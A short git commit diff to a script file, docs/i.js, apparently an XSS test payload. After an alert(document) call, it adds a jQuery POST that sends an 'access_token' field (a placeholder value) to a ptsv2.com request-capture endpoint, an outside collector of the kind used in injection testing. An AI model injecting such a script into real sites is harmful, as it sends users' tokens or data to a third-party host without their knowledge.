4ecbba8a6b895a31422daba555c1c513a33278d0
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 17:29:01 +0100

    Update i.js

--- docs/i.js
+++ docs/i.js
@@ -1,1 +1,17 @@
-alert(document)
+
+alert(document);
+$.ajax({
+    url: 'https://ptsv2.com/t/fyrw2-1641653611/post',
+    type: 'post',
+    data: {
+        access_token: 'XXXXXXXXXXXXXXXXXXX'
+    },
+    headers: {
+        Header_Name_One: 'Header Value One',   //If your header name has spaces or any other char not appropriate
+        "Header Name Two": 'Header Value Two'  //for object property name, use quoted notation shown in second
+    },
+    dataType: 'json',
+    success: function (data) {
+        console.info(data);
+    }
+});
